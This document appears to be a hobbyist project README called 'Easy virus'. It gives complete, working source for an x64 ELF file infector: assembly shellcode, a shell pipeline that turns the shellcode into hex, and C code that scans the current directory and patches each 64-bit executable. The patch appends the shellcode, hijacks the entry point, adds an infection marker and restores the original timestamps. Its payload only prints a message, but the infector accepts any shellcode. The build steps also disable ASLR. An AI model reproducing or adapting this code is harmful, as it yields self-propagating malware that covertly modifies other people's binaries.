# Easy virus (virus)

## Done

### for test

- `echo 0 > /proc/sys/kernel/randomize_va_space`

### for result

- generate x64 a "hay-code" as hex for injecting target files
  - ```sh
    nasm -f elf64 -o iAmRoot.o iAmRoot.asm
    ld -o iAmRoot iAmRoot.o
    objdump -D iAmRoot > iAmRoot.txt
    echo `objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$'` | nawk '{for(;++i<=NF;) printf(",0x%s%c", $i, (i%1)?"":(i==NF)?ORS:OFS)}'
    ```
- copy and infect test file
  - ```sh
    sudo cp /bin/echo test_echo
    sudo chown $USER:$USER test_echo
    make
    ./virus
    ```

## Hints

- from dump as "\x"-hex written
  - `for i in`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$' `; do echo -n "\\x$i" ; done ; echo -e "\n"`
- from dump as space splitted written
  - `for i in`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$' `; do echo -n "$i " ; done ; echo -e "\n"`
  - `echo`objdump -d iAmRoot | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}\$'`| nawk '{for(;++i<=NF;) printf("%s%c", $i, (i%2)?"":(i==NF)?ORS:OFS)}'`
- for testing shellcode with C
  - `gcc shellcodetester.c -fno-stack-protector -z execstack -o shellcodetester`

## heycode

```asm
; iAmRoot.asm
; author: MVladislav
; print Hey! I am an elf virus ;-)!\n and jump back
; jmp address is only a placeholder

section .text
  global iAmRoot

  iAmRoot:
    push    rax ; %rax %eax %ax %al
    push    rdi ; %rdi %edi %di %dil
    push    rsi ; %rsi %esi %si %sil
    push    rdx ; %rdx %edx %dx %dl

    xor     rdi, rdi
    mov     dil, 1
    xor     rax, rax
    mov     al, 1
    xor     rsi, rsi
    mov     rsi, 0x0a21292d3b207375 ; "us ;-)!\n" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x72697620666c6520 ; " elf vir" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x6e61206d61204920 ; " I am an" is stored in reverse order "..."
    push    rsi
    mov     rsi, 0x2179654800000000 ; "Hey!" is stored in reverse order "..."
    push    rsi

    mov     rsi, rsp
    xor     rdx, rdx
    mov     dl, 32
    syscall

    pop    rsi
    pop    rsi
    pop    rsi
    pop    rsi

    pop     rdx
    pop     rsi
    pop     rdi
    pop     rax
    jmp     0xcf73
```

## full - c-code

```c
#include <dirent.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <utime.h>

// #############################################################################
// #############################################################################
// #############################################################################

static unsigned char infection[82] = {
    0x50, 0x57, 0x56, 0x52, 0x48, 0x31, 0xff, 0x48, 0x31, 0xc0, 0xb0, 0x01, 0x48, 0x31,
    0xf6, 0x48, 0xbe, 0x75, 0x73, 0x20, 0x3b, 0x2d, 0x29, 0x21, 0x0a, 0x56, 0x48, 0xbe,
    0x20, 0x65, 0x6c, 0x66, 0x20, 0x76, 0x69, 0x72, 0x56, 0x48, 0xbe, 0x20, 0x49, 0x20,
    0x61, 0x6d, 0x20, 0x61, 0x6e, 0x56, 0x48, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x48, 0x65,
    0x79, 0x21, 0x56, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0xb2, 0x20, 0x0f, 0x05, 0x5e,
    0x5e, 0x5e, 0x5e, 0x5a, 0x5e, 0x5f, 0x58, 0xe9, 0x00, 0x00, 0x00, 0x00};

// #############################################################################
// #############################################################################
// #############################################################################

static int readFileNamesInDir(char* inDir, char* ownFileName);
static int elfCheckFile(Elf64_Ehdr* hdr);
static int elfCheck64Bit(Elf64_Ehdr* hdr);
static int getEnvAddr(FILE* entry_file, char* targetFileName);
static void writeToElf(FILE* entry_file, char* targetFileName);
static int findInfectionPhdr(Elf64_Phdr const* phdr, int count);
static void* mapFile(char const* filename, size_t* psize, struct utimbuf* utimbuf);

// #############################################################################
// #############################################################################
// #############################################################################

#define DEBUG_LOG1 1
#define DEBUG_LOG2 1
#define ERROR_LOG 1

const long unsigned int youWasHacked = 0xfeaffeaffeaffeaf;

// #############################################################################
// #############################################################################
// #############################################################################

int main(int argc, char** argv) {
  readFileNamesInDir("./", argv[0]);
  return 0;
}

// #############################################################################
// #############################################################################
// #############################################################################

static int readFileNamesInDir(char* inDir, char* ownFileName) {
  // remove for later skipping from current file name
  if (ownFileName[0] == '.' && ownFileName[1] == '/')
    ownFileName += 2;

  DIR* FD = opendir(inDir);

#if DEBUG_LOG2
  printf("%s\n", "------------------------------");
  printf("Start reading dir: %s\n", inDir);
  printf("By skipping:\n");
  printf("- %s\n", ownFileName);
  printf("- %s\n", ".");
  printf("- %s\n", "..");
  printf("%s\n", "------------------------------");
  printf("%s\n", " ");
#endif

  if (NULL != FD) {
    struct dirent* in_file = readdir(FD);

    while (in_file) {
      char* filename = malloc(strlen(in_file->d_name) + 1);
      strcpy(filename, in_file->d_name);
      in_file = readdir(FD);

      // skip what is not needed
      if (!strcmp(filename, "."))
        continue;
      if (!strcmp(filename, ".."))
        continue;
      if (!strcmp(filename, ownFileName))
        continue;

#if DEBUG_LOG2
      printf("%s\n", "------------------------------");
      printf("Files found:\n");
      printf("- %s\n", filename);
#endif

      // open file
      FILE* entry_file = fopen(filename, "rwb+");
      if (entry_file != NULL) {
        Elf64_Ehdr ehdr;
        if (fread(&ehdr, sizeof(ehdr), 1, entry_file) == 1) {
          if (elfCheckFile(&ehdr)) {
            if (elfCheck64Bit(&ehdr)) {
              if (ehdr.e_entry != 0) {
#if DEBUG_LOG2
                printf("  CHECK: '%s' is an ELF file, in 64-Bit and executable\n", filename);
#endif
                if (!getEnvAddr(entry_file, filename))
                  break;
              }
#if ERROR_LOG
              else
                fprintf(stderr, "  ERROR: '%s' is executable\n", filename);
#endif
            }
#if ERROR_LOG
            else
              fprintf(stderr, "  ERROR: '%s' is not ELF 64-Bit version\n", filename);
#endif
          }
#if ERROR_LOG
          else
            fprintf(stderr, "  ERROR: '%s' is not an ELF file\n", filename);
#endif
        }
#if ERROR_LOG
        else
          fprintf(stderr, "ERROR: fread: %s\n", strerror(errno));
#endif
        fclose(entry_file);
      }
#if ERROR_LOG
      else
        fprintf(stderr, "ERROR: Failed to open entry file - %s\n", strerror(errno));
#endif

#if DEBUG_LOG2
      printf("%s\n", "------------------------------");
      printf("\n", "");
#endif
    }
  }
#if ERROR_LOG
  else
    fprintf(stderr, "ERROR: Failed to open input directory - %s\n", strerror(errno));
#endif
  return 0;
}

// #############################################################################
// #############################################################################
// #############################################################################

static int elfCheckFile(Elf64_Ehdr* hdr) {
  if (!hdr) return 0;
  if (hdr->e_ident[EI_MAG0] != ELFMAG0) return 0;
  if (hdr->e_ident[EI_MAG1] != ELFMAG1) return 0;
  if (hdr->e_ident[EI_MAG2] != ELFMAG2) return 0;
  if (hdr->e_ident[EI_MAG3] != ELFMAG3) return 0;
  return 1;
}

static int elfCheck64Bit(Elf64_Ehdr* hdr) {
  if (!hdr) return 0;
  if (hdr->e_ident[EI_CLASS] != ELFCLASS64) return 0;
  return 1;
}

// #############################################################################
// #############################################################################
// #############################################################################

static int getEnvAddr(FILE* entry_file, char* targetFileName) {
  long unsigned int youHackedCheck;
  fseek(entry_file, 0L - sizeof(youWasHacked), SEEK_END);
  fread(&youHackedCheck, sizeof youWasHacked, 1, entry_file);

#if DEBUG_LOG2
  printf("test: 0x%" PRIx64 "\n", youWasHacked);
  printf("test: 0x%" PRIx64 "\n", youHackedCheck);
#endif

  if (youHackedCheck != youWasHacked) {
#if DEBUG_LOG2
    printf("File '%s' was not hacked, will now marked and then hacked!\n", targetFileName);
#endif
    writeToElf(entry_file, targetFileName);

    fseek(entry_file, 0L - sizeof(youWasHacked), SEEK_END);
    fwrite(&youWasHacked, sizeof youWasHacked, 1, entry_file);
    return 0;
  } else {
#if DEBUG_LOG2
    printf("%s\n", "__________________________________");
    printf("File '%s' always hacked and will skipped!\n", targetFileName);
    printf("%s\n", "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif
    return 1;
  }
}

// #############################################################################
// #############################################################################
// #############################################################################

static void writeToElf(FILE* entry_file, char* targetFileName) {
  // map the file for better work
  struct utimbuf timestamps;
  size_t filesize;
  char* image = mapFile(targetFileName, &filesize, &timestamps);

  if (image != NULL) {
    // get elf header
    Elf64_Ehdr* ehdr = (Elf64_Ehdr*)image;

    // find elf section. text to expand it and add our infection there
    int elf_section_text = -1;
    Elf64_Phdr* phdr = (Elf64_Phdr*)(image + ehdr->e_phoff);
    elf_section_text = findInfectionPhdr(phdr, ehdr->e_phnum);

#if ERROR_LOG
    if (elf_section_text < 0)
      fprintf(stderr, "ERROR: %s - unable to find a usable infection point - %s\n", targetFileName, strerror(errno));
    if ((phdr[elf_section_text].p_offset + phdr[elf_section_text].p_filesz) >= filesize)
      fprintf(stderr, "ERROR: %s - invalid program segment in header table. - %s\n", targetFileName, strerror(errno));
#endif

    // define default values
    // _____________________________

    if (elf_section_text > 0 && (phdr[elf_section_text].p_offset + phdr[elf_section_text].p_filesz) < filesize) {
      Elf64_Off virus_include_position = phdr[elf_section_text].p_vaddr + phdr[elf_section_text].p_filesz;
      off_t virus_include_position_offset = virus_include_position + sizeof infection;
      off_t virus_callback_offset = ehdr->e_entry - (virus_include_position + sizeof infection);

#if DEBUG_LOG1
      printf("%s\n", "***********************************");

      printf("Key check for file: %s\n", targetFileName);
      printf("  - target elf section text   is:  0x%" PRIx64 "\n", elf_section_text);
      printf("  - target elf pointer        is:  0x%" PRIx64 "\n", ehdr->e_entry);
      printf("  - infection size            is:  0x%" PRIx64 "\n", sizeof infection);
      printf("  - infection include pos     is:  0x%" PRIx64 "\n", virus_include_position);
      printf("  - infection include pos end is:  0x%" PRIx64 "\n", virus_include_position_offset);
      printf("  - infection callback target is:  0x%" PRIx64 "\n", virus_callback_offset);

      printf("%s\n", "***********************************");
#endif

      if (virus_callback_offset > 0x7FFFFFFFL || virus_callback_offset < -0x80000000L) {
#if ERROR_LOG
        fprintf(stderr, "ERROR: %s - cannot infect program: relative jump >2GB.- %s\n", targetFileName, strerror(errno));
#endif
      } else {
        *(Elf64_Word*)(infection + sizeof infection - 4) = (Elf64_Word)virus_callback_offset;
        ehdr->e_entry = virus_include_position;

        memcpy(image + phdr[elf_section_text].p_offset + phdr[elf_section_text].p_filesz,
               infection, sizeof infection);
        phdr[elf_section_text].p_filesz += sizeof infection;
        phdr[elf_section_text].p_memsz += sizeof infection;

        utime(targetFileName, &timestamps);
      }
    }
  } else {
#if ERROR_LOG
    fprintf(stderr, "ERROR: %s - failed open file - %s\n", targetFileName, strerror(errno));
#endif
  }
}
// #############################################################################
// #############################################################################
// #############################################################################

// #############################################################################
// #############################################################################
// #############################################################################

static int findInfectionPhdr(Elf64_Phdr const* phdr, int count) {
  Elf64_Off pos, endpos;
  int i, j;

  for (i = 0; i < count; ++i)
    if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz && (phdr[i].p_flags & PF_X)) {
      pos = phdr[i].p_offset + phdr[i].p_filesz;
      endpos = pos + sizeof infection;
      for (j = 0; j < count; ++j)
        if (phdr[j].p_offset >= pos && phdr[j].p_offset < endpos && phdr[j].p_filesz > 0)
          break;
      if (j == count)
        return i;
    }
  return -1;
}

static void* mapFile(char const* filename, size_t* psize, struct utimbuf* utimbuf) {
  struct stat stat;
  void* ptr;
  int fd;

  fd = open(filename, O_RDWR);
  if (fd < 0) {
#if ERROR_LOG
    fprintf(stderr, "ERROR: %s - %s\n", filename, strerror(errno));
#endif
  }
  if (fstat(fd, &stat)) {
#if ERROR_LOG
    fprintf(stderr, "ERROR: %s - %s\n", filename, strerror(errno));
#endif
  }
  if (!S_ISREG(stat.st_mode)) {
#if ERROR_LOG
    fprintf(stderr, "ERROR: %s - not an ordinary file. - %s\n", filename, strerror(errno));
#endif
  }

  ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (ptr == MAP_FAILED) {
#if ERROR_LOG
    fprintf(stderr, "ERROR: %s - %s\n", filename, strerror(errno));
#endif
    return NULL;
  }
  if (psize)
    *psize = (size_t)stat.st_size;
  if (utimbuf) {
    utimbuf->actime = stat.st_atime;
    utimbuf->modtime = stat.st_mtime;
  }
  return ptr;
}
```
